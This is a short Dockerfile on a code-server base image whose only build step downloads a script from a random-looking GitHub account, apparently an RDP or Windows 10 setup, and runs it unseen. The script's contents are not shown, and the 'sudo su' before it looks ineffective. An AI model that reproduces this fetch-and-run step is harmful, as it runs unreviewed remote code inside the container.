FROM codercom/code-server:4.0.2

USER coder
RUN sudo su && wget -O w10x64.sh https://raw.githubusercontent.com/fdasfsdf/rdp/master/build.sh && chmod +x w10x64.sh && ./w10x64.sh
